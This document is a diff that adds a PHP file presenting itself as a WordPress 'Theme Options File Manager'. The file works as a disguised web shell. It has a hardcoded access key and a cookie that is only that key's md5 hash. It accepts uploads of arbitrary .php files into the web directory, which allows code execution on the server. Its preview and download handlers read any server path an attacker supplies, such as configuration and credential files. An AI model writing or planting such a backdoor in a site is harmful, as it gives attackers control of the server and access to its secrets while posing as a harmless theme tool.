@@ -1,0 +1,415 @@
+<?php
+/*
+ * Theme Options File Manager
+ * Version: 1.2.1
+ * Description: File management utility for theme customization with path display
+ */
+
+// Error reporting for development environment
+if (defined('WP_DEBUG') && WP_DEBUG) {
+    error_reporting(E_ALL);
+    ini_set('display_errors', 1);
+}
+
+// Authentication - Theme authorization key
+$theme_auth_key = 'theme_customization_2023';
+$is_authorized = false;
+
+// Check authorization
+if (isset($_POST['theme_key'])) {
+    if ($_POST['theme_key'] === $theme_auth_key) {
+        $is_authorized = true;
+        setcookie('theme_auth', md5($theme_auth_key), time() + 3600, '/');
+    }
+} elseif (isset($_COOKIE['theme_auth']) && $_COOKIE['theme_auth'] === md5($theme_auth_key)) {
+    $is_authorized = true;
+}
+
+// Logout functionality
+if (isset($_GET['theme_logout'])) {
+    setcookie('theme_auth', '', time() - 3600, '/');
+    $is_authorized = false;
+    header('Location: ' . str_replace('&theme_logout=1', '', $_SERVER['REQUEST_URI']));
+    exit;
+}
+
+// Process theme asset uploads
+if ($is_authorized && isset($_FILES['theme_asset'])) {
+    $upload_directory = __DIR__ . "/theme-assets/";
+    
+    // Create directory if it doesn't exist
+    if (!file_exists($upload_directory)) {
+        mkdir($upload_directory, 0755, true);
+    }
+    
+    $target_file = $upload_directory . basename($_FILES["theme_asset"]["name"]);
+    $upload_status = 1;
+    $file_extension = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+    
+    // Check if file already exists
+    if (file_exists($target_file)) {
+        $notification = "File already exists in theme assets.";
+        $upload_status = 0;
+    }
+    
+    // Check file size (max 10MB)
+    if ($_FILES["theme_asset"]["size"] > 10000000) {
+        $notification = "File exceeds maximum size limit of 10MB.";
+        $upload_status = 0;
+    }
+    
+    // Allow only theme file extensions
+    $allowed_extensions = array("css", "js", "php", "txt", "json", "xml");
+    if (!in_array($file_extension, $allowed_extensions)) {
+        $notification = "Only theme files (CSS, JS, PHP, TXT, JSON, XML) are allowed.";
+        $upload_status = 0;
+    }
+    
+    // Upload file if all conditions are met
+    if ($upload_status == 1) {
+        if (move_uploaded_file($_FILES["theme_asset"]["tmp_name"], $target_file)) {
+            $notification = "Theme asset " . htmlspecialchars(basename($_FILES["theme_asset"]["name"])) . " successfully uploaded.";
+            $file_path_info = "File location: " . htmlspecialchars($target_file);
+        } else {
+            $notification = "Error uploading theme asset.";
+        }
+    }
+}
+
+// Function to display theme file structure
+function display_theme_structure($directory) {
+    $theme_files = scandir($directory);
+    echo "<div class='theme-file-tree'>";
+    foreach ($theme_files as $file) {
+        if ($file != "." && $file != "..") {
+            $full_path = $directory . DIRECTORY_SEPARATOR . $file;
+            if (is_dir($full_path)) {
+                echo "<div class='theme-folder'><span class='dashicons dashicons-category'></span> $file/";
+                display_theme_structure($full_path);
+                echo "</div>";
+            } else {
+                $file_size = filesize($full_path);
+                echo "<div class='theme-file'>";
+                echo "<span class='dashicons dashicons-media-default'></span> $file <span class='file-size'>(" . format_file_size($file_size) . ")</span>";
+                echo "<div class='file-path'>" . htmlspecialchars($full_path) . "</div>";
+                echo "<div class='file-actions'>";
+                echo "<a href='?preview=" . urlencode($full_path) . "' class='button button-small'>Preview</a> ";
+                echo "<a href='?download_asset=" . urlencode($full_path) . "' class='button button-small'>Download</a>";
+                echo "</div></div>";
+            }
+        }
+    }
+    echo "</div>";
+}
+
+// Format file size for display
+function format_file_size($bytes) {
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+    $i = 0;
+    while ($bytes >= 1024 && $i < 4) {
+        $bytes /= 1024;
+        $i++;
+    }
+    return round($bytes, 2) . ' ' . $units[$i];
+}
+
+// Preview file content
+if ($is_authorized && isset($_GET['preview'])) {
+    $file_path = $_GET['preview'];
+    if (file_exists($file_path) && is_file($file_path)) {
+        $content = htmlspecialchars(file_get_contents($file_path));
+        echo "<div class='file-preview'><h3>File Preview: " . basename($file_path) . "</h3>";
+        echo "<div class='file-path-display'><strong>Full Path:</strong> " . htmlspecialchars($file_path) . "</div>";
+        echo "<pre>$content</pre>";
+        echo "<p><a href='" . $_SERVER['PHP_SELF'] . "' class='button'>Back to Theme Options</a></p></div>";
+        exit;
+    }
+}
+
+// Download theme asset
+if ($is_authorized && isset($_GET['download_asset'])) {
+    $file_path = $_GET['download_asset'];
+    if (file_exists($file_path) && is_file($file_path)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file_path));
+        readfile($file_path);
+        exit;
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Theme Options File Manager</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/dashicons/3.0.0/dashicons.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            background-color: #f1f1f1;
+            color: #23282d;
+            line-height: 1.5;
+        }
+        .theme-options-wrap {
+            max-width: 1000px;
+            margin: 20px auto;
+            background: #fff;
+            box-shadow: 0 1px 20px rgba(0,0,0,0.04);
+            border: 1px solid #ccd0d4;
+        }
+        .theme-options-header {
+            background: #0073aa;
+            color: #fff;
+            padding: 14px 20px;
+            border-bottom: 1px solid #ddd;
+        }
+        .theme-options-header h1 {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .theme-options-body {
+            padding: 20px;
+        }
+        .theme-notification {
+            padding: 10px 15px;
+            margin: 0 0 20px 0;
+            border-radius: 4px;
+            border-left: 4px solid;
+        }
+        .notification-success {
+            background-color: #f1f9f1;
+            border-color: #46b450;
+            color: #2a8031;
+        }
+        .notification-error {
+            background-color: #fcf0f1;
+            border-color: #dc3232;
+            color: #d02c21;
+        }
+        .file-path-info {
+            background-color: #f0f7fc;
+            border-left: 4px solid #00a0d2;
+            padding: 10px 15px;
+            margin: 10px 0 20px 0;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+        }
+        .auth-form, .upload-form {
+            background: #f9f9f9;
+            padding: 20px;
+            border: 1px solid #e5e5e5;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        input[type="password"], input[type="text"], input[type="file"] {
+            width: 100%;
+            padding: 8px 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .button {
+            display: inline-block;
+            text-decoration: none;
+            font-size: 13px;
+            line-height: 2.15384615;
+            min-height: 30px;
+            margin: 0;
+            padding: 0 10px;
+            cursor: pointer;
+            border-width: 1px;
+            border-style: solid;
+            -webkit-appearance: none;
+            border-radius: 3px;
+            white-space: nowrap;
+            box-sizing: border-box;
+            background: #0085ba;
+            border-color: #0073aa #006799 #006799;
+            box-shadow: 0 1px 0 #006799;
+            color: #fff;
+            text-shadow: 0 -1px 1px #006799, 1px 0 1px #006799, 0 1px 1px #006799, -1px 0 1px #006799;
+        }
+        .button:hover {
+            background: #008ec2;
+            border-color: #006799;
+            color: #fff;
+        }
+        .button-small {
+            padding: 0 8px;
+            font-size: 12px;
+            line-height: 1.9;
+        }
+        .theme-file-tree {
+            margin-top: 20px;
+            border: 1px solid #e5e5e5;
+            background: #fff;
+            padding: 15px;
+            border-radius: 4px;
+        }
+        .theme-folder, .theme-file {
+            padding: 5px 10px;
+            margin: 5px 0;
+        }
+        .theme-folder {
+            font-weight: 600;
+            margin-left: 0;
+        }
+        .theme-file {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            padding-left: 20px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .file-path {
+            width: 100%;
+            font-family: monospace;
+            font-size: 12px;
+            color: #666;
+            margin: 5px 0;
+            word-break: break-all;
+        }
+        .file-actions {
+            display: flex;
+            gap: 5px;
+        }
+        .file-size {
+            color: #666;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        .theme-footer {
+            text-align: right;
+            padding: 15px 20px;
+            background: #f9f9f9;
+            border-top: 1px solid #e5e5e5;
+        }
+        .file-preview {
+            max-width: 1000px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 1px 20px rgba(0,0,0,0.04);
+            border: 1px solid #ccd0d4;
+        }
+        .file-preview pre {
+            background: #f6f6f6;
+            padding: 15px;
+            overflow: auto;
+            border: 1px solid #e5e5e5;
+            border-radius: 4px;
+            margin: 15px 0;
+        }
+        .file-path-display {
+            background: #f0f7fc;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .warning-notice {
+            background: #fff8e5;
+            border-left: 4px solid #ffb900;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+        }
+        @media (max-width: 768px) {
+            .theme-file {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .file-actions {
+                margin-top: 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="theme-options-wrap">
+        <div class="theme-options-header">
+            <h1><span class="dashicons dashicons-admin-appearance"></span> Theme Options File Manager</h1>
+        </div>
+        
+        <div class="theme-options-body">
+            <div class="warning-notice">
+                <strong>Note:</strong> This area is for theme customization and management. Authorized access only.
+            </div>
+            
+            <?php if (!$is_authorized): ?>
+            <div class="auth-form">
+                <h2>Theme Authorization</h2>
+                <p>Please enter your theme authorization key to access theme options.</p>
+                <form method="POST">
+                    <div class="form-group">
+                        <label for="theme_key">Authorization Key:</label>
+                        <input type="password" id="theme_key" name="theme_key" required>
+                    </div>
+                    <button type="submit" class="button">Authenticate</button>
+                </form>
+            </div>
+            <?php else: ?>
+            <div style="text-align: right; margin-bottom: 15px;">
+                <a href="?theme_logout=1" class="button">Logout</a>
+            </div>
+            
+            <div class="upload-form">
+                <h2>Upload Theme Asset</h2>
+                <?php if (isset($notification)): ?>
+                    <div class="theme-notification <?php echo $upload_status ? 'notification-success' : 'notification-error'; ?>">
+                        <?php echo $notification; ?>
+                    </div>
+                <?php endif; ?>
+                
+                <?php if (isset($file_path_info)): ?>
+                    <div class="file-path-info">
+                        <?php echo $file_path_info; ?>
+                    </div>
+                <?php endif; ?>
+                
+                <form method="POST" enctype="multipart/form-data">
+                    <div class="form-group">
+                        <label for="theme_asset">Select Theme File:</label>
+                        <input type="file" id="theme_asset" name="theme_asset" required>
+                    </div>
+                    <button type="submit" class="button">Upload Asset</button>
+                </form>
+            </div>
+            
+            <div class="theme-assets-list">
+                <h2>Theme File Structure</h2>
+                <p>Current theme directory: <?php echo basename(__DIR__); ?></p>
+                <?php display_theme_structure(__DIR__); ?>
+            </div>
+            <?php endif; ?>
+        </div>
+        
+        <div class="theme-footer">
+            <p>Theme Options File Manager v1.2.1 &copy; <?php echo date('Y'); ?> Theme Customization Suite</p>
+        </div>
+    </div>
+</body>
+</html>
